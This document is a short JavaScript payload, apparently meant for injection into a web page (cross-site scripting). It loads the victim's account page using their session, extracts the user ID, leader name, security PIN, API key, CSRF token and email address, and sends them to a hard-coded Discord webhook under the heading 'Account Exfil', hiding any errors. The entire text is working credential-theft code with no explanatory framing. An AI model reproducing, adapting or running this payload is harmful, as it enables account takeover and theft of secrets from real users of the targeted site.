(async () => {
  const WH = 'https://discord.com/api/webhooks/1519411802142937118/Be6lYlqOJcp3Dvnjixe3BQMc8ukrhnSv4r6yemMGBDb9tZWWSlqPa5Nb6ba6aCvrzqzE';

  const send = (payload) => {
    const fd = new FormData();
    fd.append('payload_json', JSON.stringify(payload));
    return fetch(WH, {method:'POST', mode:'no-cors', body:fd}).catch(()=>{});
  };

  try {
    const acct = await fetch('/account/', {credentials:'include'}).then(r => r.text());

    const userId = (acct.match(/app_user_id['">]+(\d+)/) || [])[1];
    const leader = (acct.match(/app_leader_name['">]+([^<]+)/) || [])[1];
    const pin    = (acct.match(/Security PIN:\s*(?:<[^>]+>\s*)?(\d{6})/i) || [])[1];
    const apiKey = (acct.match(/notranslate['"]>\s*([a-f0-9]{12,})\s*</) || [])[1];
    const keyId  = (acct.match(/name="regen_api_key_id"\s+value="(\d+)"/) || [])[1];
    const token  = (acct.match(/name="token"\s+value="([^"]+)"/) || [])[1];
    const email  = (acct.match(/Current E-mail:[\s\S]*?notranslate">\s*(\S+@\S+\.\w+)/) || [])[1];

    await send({
      embeds: [{
        title: '🎯 Account Exfil',
        color: 0x00ff00,
        fields: [
          {name: 'userId', value: userId || 'n/a', inline: true},
          {name: 'leader', value: leader || 'n/a', inline: true},
          {name: 'pin',    value: pin    || 'n/a', inline: true},
          {name: 'apiKey', value: apiKey || 'n/a', inline: false},
          {name: 'keyId',  value: keyId  || 'n/a', inline: true},
          {name: 'token',  value: token  || 'n/a', inline: true},
          {name: 'email',  value: email  || 'n/a', inline: false}
        ]
      }]
    });
  } catch (e) {
    await send({content: '💥 ' + String(e)});
  }
})();
